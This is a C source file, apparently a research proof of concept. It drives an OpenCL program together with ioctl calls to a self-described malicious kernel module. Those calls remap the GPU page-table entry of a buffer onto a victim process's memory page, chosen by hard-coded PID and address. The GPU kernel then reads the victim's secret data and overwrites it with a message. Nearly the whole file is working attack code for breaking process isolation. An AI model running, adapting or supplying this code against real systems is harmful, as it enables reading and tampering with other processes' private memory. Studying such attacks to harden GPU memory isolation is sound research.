#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <string.h>

#include "get_phys_ioctl.h"
#include "inconsistent_map.h"

#include <CL/cl.h>


#define PG_OFFSET_MASK 0xfff
#define MAX_SOURCE_SIZE (0x100000)
#define CLCHK(ret, l) ({ \
    if (ret != CL_SUCCESS) { \
        printf("Error %d at %d\n", ret, l); \
        exit(EXIT_FAILURE); \
    } \
})

int main(void) {
    struct proc_page victim;
    victim.pidnr = 2920;
    victim.vaddr = 0x558584741000;
    unsigned long gpuvaddr;
    
    
    // Create the two input vectors
    int i;
    const int LIST_SIZE = 4096;
    char *A = (char*)malloc(sizeof(char)*LIST_SIZE);
    size_t *B = (size_t*)malloc(sizeof(size_t)*LIST_SIZE);
    size_t *C = (size_t*)malloc(sizeof(size_t)*LIST_SIZE);
    B[0] = RD_PAGE;
    for(i = 0; i < LIST_SIZE; i++) {
        A[i] = ' ' + i;
    }

    // Load the kernel source code into the array source_str
    FILE *fp;
    char *source_str;
    size_t source_size;

    fp = fopen("bot.cl", "r");
    if (!fp) {
        fprintf(stderr, "Failed to load kernel.\n");
        exit(1);
    }
    source_str = (char*)malloc(MAX_SOURCE_SIZE);
    source_size = fread(source_str, 1, MAX_SOURCE_SIZE, fp);
    fclose(fp);

    // Get platform and device information
    cl_platform_id platform_id = NULL;
    cl_device_id device_id = NULL;
    cl_uint ret_num_devices;
    cl_uint ret_num_platforms;
    cl_int ret = clGetPlatformIDs(1, &platform_id, &ret_num_platforms);
    ret = clGetDeviceIDs( platform_id, CL_DEVICE_TYPE_DEFAULT, 1,
            &device_id, &ret_num_devices);
    CLCHK(ret, __LINE__);
    
    // Create an OpenCL context
    puts("[-------------------OpenCL API]: creates a GPU context");
    cl_context context = clCreateContext( NULL, 1, &device_id, NULL, NULL, &ret);
    puts("[Malicious Kernel Module IOCTL]: opens the device file");
    int fd = open("/dev/Get_Phys", O_RDONLY);
    if (fd < 0){
        perror("error opening file: ");
        return -1;
    }
    puts("[Malicious Kernel Module IOCTL]: sets the target context");
    if (ioctl(fd, get_phys_IOGETLASTCTX, NULL) == -1){
            perror("error getting last context: ");
            return -1;
    }
    puts("[Malicious Kernel Module IOCTL]: finds PFN of the secret data in the victim process");

    if (ioctl(fd, get_phys_IOSETVICTIM, &victim) == -1){
            perror("error setting victim: ");
            return -1;
    }
    
    
    
    
    // Create a command queue
    puts("[-------------------OpenCL API]: creates a command queue corresponding to the context");
    cl_command_queue command_queue = clCreateCommandQueue(context, device_id, 0, &ret);
    // Create memory buffers on the device for each vector
    puts("[-------------------OpenCL API]: creates buffer");
    cl_mem a_mem_obj = clCreateBuffer(context, CL_MEM_USE_HOST_PTR,
            LIST_SIZE * sizeof(char), A, &ret);
    CLCHK(ret, __LINE__);
    cl_mem b_mem_obj = clCreateBuffer(context, CL_MEM_USE_HOST_PTR,
            LIST_SIZE * sizeof(size_t), B, &ret);
    CLCHK(ret, __LINE__);
    cl_mem c_mem_obj = clCreateBuffer(context, CL_MEM_USE_HOST_PTR,
            LIST_SIZE * sizeof(size_t), C, &ret);
    CLCHK(ret, __LINE__);
            
    // // Copy the lists A and B to their respective memory buffers
    ret = clEnqueueWriteBuffer(command_queue, a_mem_obj, CL_TRUE, 0,
            LIST_SIZE * sizeof(char), A, 0, NULL, NULL);
    CLCHK(ret, __LINE__);
    ret = clEnqueueWriteBuffer(command_queue, b_mem_obj, CL_TRUE, 0,
            LIST_SIZE * sizeof(size_t), B, 0, NULL, NULL);
    CLCHK(ret, __LINE__);


    puts("[-------------------OpenCL API]: creates program");
    // Create a program from the kernel source
    cl_program program = clCreateProgramWithSource(context, 1,
            (const char **)&source_str, (const size_t *)&source_size, &ret);

    // Build the program
    ret = clBuildProgram(program, 1, &device_id, NULL, NULL, NULL);
    if (ret == -11) {
        // Allocate memory for the log
        size_t log_size=16384;
        char *log = (char *) malloc(log_size);

        // Get the log
        clGetProgramBuildInfo(program, device_id, CL_PROGRAM_BUILD_LOG, log_size, log, NULL);

        // Print the log
        printf("%s\n", log);
        exit(-11);
    }
    



    // Create the OpenCL kernel
    puts("[-------------------OpenCL API]: creates kernel");
    cl_kernel kernel = clCreateKernel(program, "vector_add", &ret);

    // Set the arguments of the kernel
    ret = clSetKernelArg(kernel, 0, sizeof(cl_mem), (void *)&a_mem_obj);
    ret = clSetKernelArg(kernel, 1, sizeof(cl_mem), (void *)&b_mem_obj);
    ret = clSetKernelArg(kernel, 2, sizeof(cl_mem), (void *)&c_mem_obj);
    // printf("-->%lx\n", (unsigned long) a_mem_obj);
    // Execute the OpenCL kernel on the list
    size_t global_item_size = LIST_SIZE; // Process the entire lists
    size_t local_item_size = 64; // Divide work items into groups of 64
    
    
    // we may not have page at 0x110000 before launching 
    // the kernel, so it is irrelevant to set the ppgtt at this point.
    // Stop the program here and see the proc file for detail
    // if (ioctl(fd, get_phys_IOSETPPGTT, &gpuvaddr) == -1){
    //         perror("error setting ppgtt: ");
    //         return -1;
    // }
    printf("<><><><><><><><><><><><><><><><><><><><><><><><><><><><\n");
    read(0, source_str, 19);

    puts("[-------------------OpenCL API]: enqueues kernel");
    ret = clEnqueueNDRangeKernel(command_queue, kernel, 1, NULL,
            &global_item_size, &local_item_size, 0, NULL, NULL);
    CLCHK(ret, __LINE__);
    printf("enqueued %d\n",ret );
    ret = clFinish(command_queue);
    CLCHK(ret, __LINE__);  
    printf("<><><><><><><><><><><><><><><><><><><><><><><><><><><><\n");
    puts("[-------------------OpenCL API]: enqueues read buffer to get vaddr of the buffer");
    ret = clEnqueueReadBuffer(command_queue, c_mem_obj, CL_TRUE, 0,
            LIST_SIZE * sizeof(size_t), C, 0, NULL, NULL);
    printf("===============================> virtual address of the dummy buffer=0x%llx\n", C[0]);
    gpuvaddr = C[0];
    puts("[Malicious Kernel Module IOCTL]: sets pte of the buffer object in its kernel context");
    // now we got the mapping, so do it and re-enqueue the kernel to see what happend
    if (ioctl(fd, get_phys_IOSETPPGTT, &gpuvaddr) == -1){
            perror("error setting ppgtt: ");
            return -1;
    }
    
    // 
    printf("<><><><><><><><><><><><><><><><><><><><><><><><><><><><\n");
    read(0, source_str, 19);

    
    B[0] = RD_PAGE_WITH_OFFSET;
    B[1] = gpuvaddr & PG_OFFSET_MASK;
    ret = clEnqueueWriteBuffer(command_queue, b_mem_obj, CL_TRUE, 0,
            LIST_SIZE * sizeof(size_t), B, 0, NULL, NULL);
    CLCHK(ret, __LINE__);
    
    
    puts("[-------------------OpenCL API]: enqueues kernel again to obtain data");
    ret = clEnqueueNDRangeKernel(command_queue, kernel, 1, NULL,
            &global_item_size, &local_item_size, 0, NULL, NULL);
    CLCHK(ret, __LINE__);
    printf("enqueued %d\n",ret );
    ret = clFinish(command_queue);
    CLCHK(ret, __LINE__);  
    
    
    
    
    
    // Read the memory buffer C on the device to the local variable C
    // ret = clEnqueueReadBuffer(command_queue, c_mem_obj, CL_TRUE, 0,
    //         LIST_SIZE * sizeof(size_t), C, 0, NULL, NULL);

    // Display the result to the screen
    // for(i = 0; i < LIST_SIZE; i++)
    //    if (A[i] + B[i] != C[i]) printf("Error at %dth element in which %d+%d != %d\n",i, A[i], B[i], C[i] );
    // printf("Finish %d\n",ret );
    // Clean up
    ret = clFinish(command_queue);
    
    // if (ioctl(fd, get_phys_IOLOOPCTX, NULL) == -1){
    //         perror("error getting last context: ");
    //         return -1;
    // }
    printf("<><><><><><><><><><><><><><><><><><><><><><><><><><><><\n");
    read(0, source_str, 10);
    
    B[0] = WR_PAGE_WITH_OFFSET;
    memcpy((char*)(B+2), "And I can modify it from GPU!!!\n", 33);
    ret = clEnqueueWriteBuffer(command_queue, b_mem_obj, CL_TRUE, 0,
            LIST_SIZE * sizeof(size_t), B, 0, NULL, NULL);
    
    puts("[-------------------OpenCL API]: enqueues kernel again to set data");
    printf("<><><><><><><><><><><><><><><><><><><><><><><><><><><><\n");
    ret = clEnqueueNDRangeKernel(command_queue, kernel, 1, NULL,
            &global_item_size, &local_item_size, 0, NULL, NULL);
    CLCHK(ret, __LINE__);
    printf("enqueued %d\n",ret );
    ret = clFinish(command_queue);
    CLCHK(ret, __LINE__);  
    printf("<><><><><><><><><><><><><><><><><><><><><><><><><><><><\n");
    
    
    
    
    puts("[-------------------OpenCL API]: cleanups");
    ret = clReleaseKernel(kernel);
    ret = clReleaseProgram(program);
    ret = clReleaseMemObject(a_mem_obj);
    ret = clReleaseMemObject(b_mem_obj);
    ret = clReleaseMemObject(c_mem_obj);
    ret = clReleaseCommandQueue(command_queue);
    ret = clReleaseContext(context);
    free(A);
    free(B);
    free(C);
    puts("[Malicious Kernel Module IOCTL]: closes the device file");
    close(fd);
    return 0;
}
